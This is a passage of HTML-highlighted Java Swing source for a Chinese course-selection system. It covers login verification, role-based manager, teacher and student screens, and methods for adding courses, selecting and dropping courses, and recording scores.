student_init_page</span></span><br><span class="line">        student_init_page.add(student_jl_init);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//student_cards student_select_course_page</span></span><br><span class="line">        student_select_course_page.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        student_select_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> (Student)user;</span><br><span class="line">                HashMap&lt;Integer, List&gt; stu_not_course = s.getCourseStuNotSelected();</span><br><span class="line">                s.selStuCourse(((Entry&lt;Integer, List&gt;)student_select_course_jl.getSelectedValue()).getKey());</span><br><span class="line">                reloadCourseStuNotSelectedList(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//student_cards student_delect_course_page</span></span><br><span class="line">        student_delect_course_page.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        student_delect_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> (Student)user;</span><br><span class="line">                s.delStuCourse((<span class="type">int</span>)((List)student_delect_course_jl.getSelectedValue()).get(<span class="number">1</span>));</span><br><span class="line">                reloadScoreStuList(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        student_select_course_page.add(<span class="string">&quot;North&quot;</span>,student_jl_0_0);</span><br><span class="line">        student_select_course_page.add(<span class="string">&quot;Center&quot;</span>,student_select_course_jsp);</span><br><span class="line">        student_select_course_page.add(<span class="string">&quot;South&quot;</span>,student_select_course);</span><br><span class="line">        </span><br><span class="line">        student_delect_course_page.add(<span class="string">&quot;North&quot;</span>,student_jl_0_1);</span><br><span class="line">        student_delect_course_page.add(<span class="string">&quot;Center&quot;</span>,student_delect_course_jsp);</span><br><span class="line">        student_delect_course_page.add(<span class="string">&quot;South&quot;</span>,student_delect_course);</span><br><span class="line">        </span><br><span class="line">        student_view_score_page.add(student_jl_0_2);</span><br><span class="line"></span><br><span class="line">        student_cards.setLayout(student_c_layout);</span><br><span class="line">        student_cards.add(<span class="string">&quot;student_init_page&quot;</span>,student_init_page);</span><br><span class="line">        student_cards.add(<span class="string">&quot;student_select_course_page&quot;</span>,student_select_course_page);</span><br><span class="line">        student_cards.add(<span class="string">&quot;student_delect_course_page&quot;</span>,student_delect_course_page);</span><br><span class="line"></span><br><span class="line">        content_cards.add(<span class="string">&quot;student_cards&quot;</span>,student_cards);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initManagerPage</span><span class="params">()</span> &#123;</span><br><span class="line">        manager_jc_teacher.setRenderer(<span class="keyword">new</span> <span class="title class_">TeaCellRenderer</span>());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_menuBar</span></span><br><span class="line">        manager_menuBar.add(manager_menu);</span><br><span class="line">        manager_menu.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                manager_c_layout.show(manager_cards, <span class="string">&quot;manager_new_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        menu_cards.add(<span class="string">&quot;manager_menuBar&quot;</span>,manager_menuBar);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_init_page</span></span><br><span class="line">        manager_init_page.add(manager_jl_init);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_new_course_page</span></span><br><span class="line">        manager_new_course_page.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line">        manager_new_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                Entry&lt;Integer,String&gt; t = (Entry&lt;Integer, String&gt;) manager_jc_teacher.getSelectedItem();</span><br><span class="line">                <span class="type">Manager</span> <span class="variable">m</span> <span class="operator">=</span> (Manager)user;</span><br><span class="line">                m.newCourse(manager_jt_course_name.getText(), t.getKey(), manager_jt_course_info.getText());</span><br><span class="line">                manager_jt_course_name.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                manager_jt_course_info.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                JOptionPane.showMessageDialog(<span class="literal">null</span>, <span class="string">&quot;课程添加成功！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        manager_new_course_page.add(manager_jl_0);</span><br><span class="line">        manager_new_course_page.add(manager_jl_1);</span><br><span class="line">        manager_new_course_page.add(manager_jt_course_name);</span><br><span class="line">        manager_new_course_page.add(manager_jl_2);</span><br><span class="line">        manager_new_course_page.add(manager_jc_teacher);</span><br><span class="line">        manager_new_course_page.add(manager_jl_3);</span><br><span class="line">        manager_new_course_page.add(manager_jt_course_info);</span><br><span class="line">        manager_new_course_page.add(manager_new_course);</span><br><span class="line"></span><br><span class="line">        manager_cards.setLayout(manager_c_layout);</span><br><span class="line">        manager_cards.add(<span class="string">&quot;manager_init_page&quot;</span>,manager_init_page);</span><br><span class="line">        manager_cards.add(<span class="string">&quot;manager_new_course_page&quot;</span>,manager_new_course_page);</span><br><span class="line"></span><br><span class="line">        content_cards.add(<span class="string">&quot;manager_cards&quot;</span>,manager_cards);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置当前用户，由登录界面调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUser</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">        <span class="keyword">if</span>(user.getType()==<span class="number">0</span>) &#123;</span><br><span class="line">            setTeacherList();</span><br><span class="line">            manager_jl_0.setText(<span class="string">&quot;管理员:&quot;</span>+user.getUsername()+<span class="string">&quot; 编号:&quot;</span>+user.getUserId());</span><br><span class="line">            manager_jl_init.setText(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;欢迎来到选课系统&lt;br&gt;&quot;</span>+<span class="string">&quot;管理员:&quot;</span>+user.getUsername()+<span class="string">&quot; 编号:&quot;</span>+user.getUserId()+<span class="string">&quot;&lt;br&gt;请选择功能&quot;</span>+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            content_c_layout.show(content_cards, <span class="string">&quot;manager_cards&quot;</span>);</span><br><span class="line">            menu_c_layout.show(menu_cards, <span class="string">&quot;manager_menuBar&quot;</span>);</span><br><span class="line">            manager_c_layout.show(manager_cards, <span class="string">&quot;manager_init_page&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(user.getType()==<span class="number">1</span>) &#123;</span><br><span class="line">            setTeacherList_course();</span><br><span class="line">            teacher_jl_0.setText(<span class="string">&quot;教师: &quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            teacher_jl_init.setText(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;欢迎来到选课系统&lt;br&gt;&quot;</span>+<span class="string">&quot;教师: &quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId()+<span class="string">&quot;&lt;br&gt;请选择功能&quot;</span>+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            content_c_layout.show(content_cards, <span class="string">&quot;teacher_cards&quot;</span>);</span><br><span class="line">            menu_c_layout.show(menu_cards, <span class="string">&quot;teacher_menuBar&quot;</span>);</span><br><span class="line">            teacher_c_layout.show(teacher_cards, <span class="string">&quot;teacher_init_page&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(user.getType()==<span class="number">2</span>) &#123;</span><br><span class="line">            student_jl_0_0.setText(<span class="string">&quot;学生姓名:&quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            student_jl_0_1.setText(<span class="string">&quot;学生姓名:&quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            student_jl_0_2.setText(<span class="string">&quot;学生姓名:&quot;</span>+user.getUsername()+<span class="string">&quot;  编号:&quot;</span>+user.getUserId());</span><br><span class="line">            student_jl_init.setText(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;欢迎来到选课系统&lt;br&gt;&quot;</span>+<span class="string">&quot;学生: &quot;</span>+user.getUsername()+<span class="string">&quot;    编号: &quot;</span>+user.getUserId()+<span class="string">&quot;&lt;br&gt;请选择功能&quot;</span>+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            content_c_layout.show(content_cards, <span class="string">&quot;student_cards&quot;</span>);</span><br><span class="line">            menu_c_layout.show(menu_cards, <span class="string">&quot;student_menuBar&quot;</span>);</span><br><span class="line">            student_c_layout.show(student_cards, <span class="string">&quot;student_init_page&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTeacherList</span><span class="params">()</span> &#123;</span><br><span class="line">        manager_jc_teacher.removeAllItems();</span><br><span class="line">        HashMap&lt;Integer, String&gt; teacher = db.getTeacher();</span><br><span class="line">        <span class="keyword">for</span>(Entry&lt;Integer, String&gt; entry:teacher.entrySet()) &#123;</span><br><span class="line">            manager_jc_teacher.addItem(entry);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//更新教师界面中选中课程的选课信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadScoreTea</span><span class="params">(Teacher t, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        teacher_score_dlm.clear();</span><br><span class="line">        ArrayList&lt;List&gt; teacher_course = t.getScoreTeacher(course_id);</span><br><span class="line">        <span class="keyword">for</span>(List l:teacher_course) &#123;</span><br><span class="line">            teacher_score_dlm.addElement(l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTeacherList_course</span><span class="params">()</span> &#123;</span><br><span class="line">        teacher_jc_course.removeAllItems();</span><br><span class="line">        List&lt;Integer&gt; teacher_course = db.getTeacherCourse(user.getUserId());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> l:teacher_course) &#123;</span><br><span class="line">            teacher_jc_course.addItem(l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 更新学生界面中学生可选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadCourseStuNotSelectedList</span><span class="params">(Student s)</span> &#123;</span><br><span class="line">        student_select_course_dlm.clear();</span><br><span class="line">    </span><br><span class="line">        HashMap&lt;Integer, List&gt; course = s.getCourseStuNotSelected();</span><br><span class="line">        <span class="keyword">for</span>(Entry&lt;Integer, List&gt; entry:course.entrySet()) &#123;</span><br><span class="line">            student_select_course_dlm.addElement(entry);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 更新学生界面中学生已选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reloadScoreStuList</span><span class="params">(Student s)</span> &#123;</span><br><span class="line">        student_delect_course_dlm.clear();</span><br><span class="line">        ArrayList&lt;List&gt; student_score = s.getScoreStu();</span><br><span class="line">        <span class="keyword">for</span>(List l:student_score) &#123;</span><br><span class="line">            student_delect_course_dlm.addElement(l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initFrame</span><span class="params">(LoginFrame login_frame)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.login_frame = login_frame;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 清空该用户信息。退出界面时调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> &#123;</span><br><span class="line">        teacher_score_dlm.clear();</span><br><span class="line">        manager_jt_course_name.setText(<span class="literal">null</span>);</span><br><span class="line">        manager_jt_course_info.setText(<span class="literal">null</span>);</span><br><span class="line">        teacher_jt_score.setText(<span class="literal">null</span>);</span><br><span class="line">        user = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MainFrame manager_frame;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">tf_user</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPasswordField</span> <span class="variable">tf_pwd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPasswordField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">login</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;登录&quot;</span>);      <span class="comment">// 用户登录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">jl_login</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> Database db;</span><br><span class="line">    <span class="keyword">private</span> Teach teach;</span><br><span class="line">    <span class="keyword">private</span> User u;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFrame</span><span class="params">(Database db, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;选课系统登录&quot;</span>);        </span><br><span class="line">        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="built_in">this</span>.db = db;</span><br><span class="line">        <span class="built_in">this</span>.teach = teach;</span><br><span class="line">        setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        setLocation(<span class="number">800</span>,<span class="number">400</span>);</span><br><span class="line">        setSize(<span class="number">250</span>,<span class="number">200</span>);</span><br><span class="line">        login.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> verifyUser(tf_user.getText(), String.valueOf(tf_pwd.getPassword()));</span><br><span class="line">                <span class="keyword">if</span>(user==<span class="literal">null</span>) &#123;</span><br><span class="line">                    jl.setText(<span class="string">&quot;user or pwd error&quot;</span>); </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    tf_user.setText(<span class="literal">null</span>);</span><br><span class="line">                    tf_pwd.setText(<span class="literal">null</span>);</span><br><span class="line">                    setVisible(<span class="literal">false</span>);</span><br><span class="line">                    manager_frame.setUser(user);</span><br><span class="line">                    manager_frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">                    jl.setText(<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;);</span><br><span class="line">        add(tf_user);</span><br><span class="line">        add(tf_pwd);</span><br><span class="line">        add(login);</span><br><span class="line">        add(jl);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initFrame</span><span class="params">(MainFrame manager_frame)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.manager_frame = manager_frame;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 验证用户名密码。如果正确，返回用户对象；如果错误，返回null</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">verifyUser</span><span class="params">(String user, String pwd)</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">account</span> <span class="operator">=</span> db.getAccount(user);</span><br><span class="line">        u = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(account == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pwd.compareTo((String)account.get(<span class="number">0</span>))==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)account.get(<span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                u = <span class="keyword">new</span> <span class="title class_">Manager</span>(user, pwd, (<span class="type">int</span>)account.get(<span class="number">1</span>),(<span class="type">int</span>)account.get(<span class="number">2</span>),(String)account.get(<span class="number">3</span>), teach);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((<span class="type">int</span>)account.get(<span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">                u = <span class="keyword">new</span> <span class="title class_">Teacher</span>(user, pwd, (<span class="type">int</span>)account.get(<span class="number">1</span>),(<span class="type">int</span>)account.get(<span class="number">2</span>),(String)account.get(<span class="number">3</span>), teach);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((<span class="type">int</span>)account.get(<span class="number">1</span>) == <span class="number">2</span>) &#123;</span><br><span class="line">                u = <span class="keyword">new</span> <span class="title class_">Student</span>(user, pwd, (<span class="type">int</span>)account.get(<span class="number">1</span>),(<span class="type">int</span>)account.get(<span class="number">2</span>),(String)account.get(<span class="number">3</span>), teach);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> u;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    String user;    <span class="comment">// 用户名</span></span><br><span class="line">    String pwd;     <span class="comment">// 密码</span></span><br><span class="line">    <span class="type">int</span> type;       <span class="comment">// 用户类型</span></span><br><span class="line">    <span class="type">int</span> account_id; <span class="comment">// 用户编号</span></span><br><span class="line">    String account_name;    <span class="comment">// 用户名字</span></span><br><span class="line">    Teach teach;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">        <span class="built_in">this</span>.pwd = pwd;</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.account_id = account_id;</span><br><span class="line">        <span class="built_in">this</span>.account_name = account_name;</span><br><span class="line">        <span class="built_in">this</span>.teach = teach;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account_name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getUserId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account_id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(user, pwd, type, account_id, account_name, teach);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生选课。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">selStuCourse</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        teach.selStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生可选课程。 返回可选课程字典</span></span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourseStuNotSelected</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getCourseStuNotSelected(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生退课。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delStuCourse</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        teach.delStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生所选课程信息。 返回所选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreStu</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getScoreStu(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Teacher</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(user, pwd, type, account_id, account_name, teach);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询课程所有学生成绩。 返回成绩列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreTeacher</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getScoreTeacher(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询选中课程详细信息。返回课程信息</span></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getCourseInfo</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getCourseInfo(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 教师对学生课程打分。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">scoreStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id, <span class="type">int</span> student_score)</span> &#123;</span><br><span class="line">        teach.scoreStuCourse(student_id, course_id, student_score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Manager</span> <span class="keyword">extends</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Manager</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(user, pwd, type, account_id, account_name,teach);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新建课程。如果成功，返回课程编号，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">newCourse</span><span class="params">(String course_name, <span class="type">int</span> teacher_id , String course_info)</span> &#123;</span><br><span class="line">        teach.newCourse(course_name, teacher_id, course_info);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teach</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Database db;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Teach</span><span class="params">(Database db)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.db = db;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新建课程，进行检查并进行数据库存入。如果成功，返回课程编号，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">newCourse</span><span class="params">(String course_name, <span class="type">int</span> teacher_id , String course_info)</span> &#123;</span><br><span class="line">        db.addCourse(course_name, teacher_id, course_info);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生选课，进行检查并进行数据库存入。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">selStuCourse</span><span class="params">(<span class="type">int</span> account_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        db.addStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生退课，进行检查并进行数据库存入。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delStuCourse</span><span class="params">(<span class="type">int</span> account_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        db.delStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 教师对学生课程打分。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">scoreStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id, <span class="type">int</span> student_score)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(student_score&lt;-<span class="number">1</span> | student_score&gt;<span class="number">100</span>) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="literal">null</span>, <span class="string">&quot;请输入0-100的整数&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            db.addStuScore(student_id, course_id, student_score);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询课程详细信息。返回课程信息</span></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getCourseInfo</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> db.getCourse().get(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询课程所有学生成绩。 返回成绩列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreTeacher</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> 